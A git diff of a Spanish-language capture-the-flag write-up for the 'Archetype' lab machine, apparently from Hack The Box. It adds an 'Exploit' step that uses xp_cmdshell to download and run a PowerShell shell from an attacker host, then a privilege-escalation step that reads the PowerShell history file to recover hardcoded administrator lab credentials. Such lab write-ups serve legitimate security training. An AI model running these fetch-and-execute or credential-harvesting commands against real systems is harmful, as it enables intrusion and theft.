@@ -59,6 +59,7 @@ En el archivo tenemoss un par de user:pass
 Password=M3g4c0rp123;User ID=ARCHETYPE\sql_svc
 ```
 ### MSS SQL
+Para conevtarnos usaremos el mssqlclient.py de la suite impacket
 ```
 mssqlclient.py 'ARCHETYPE/sql_svc:M3g4c0rp123@10.10.10.27' -windows-auth
 ```
@@ -72,8 +73,19 @@ Bien con esto tenemos un RCE ya que el server nos permite ejecutar comandos de C
      sp_start_job {cmd}         - executes cmd using the sql server agent (blind)
      ! {cmd}                    - executes a local shell cmd
 ```
-Verificamos que tenemos permiso como sysadmin
+## Exploit
+Subimos una shell en el servidor mediante el siguiente comando 
 ```
-SELECT IS_SRVROLEMEMBER ('sysadmin')
+xp_cmdshell "powershell "IEX (New-Object Net.WebClient).DownloadString(\"http://10.10.14.20/shell.ps1\");"
 ```
+## Privesc
 
+Podemos acceder al historial de PowerShell
+```
+type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt 
+```
+Podemos ver las contraseñas hardcodeadas
+```
+net.exe use T: \\Archetype\backups /user:administrator MEGACORP_4dm1n!!
+```
+Con esto solo nos queda logearnos como administrador, usaremos para ello usaremos la utilidad psexec.py de la suite de impacket
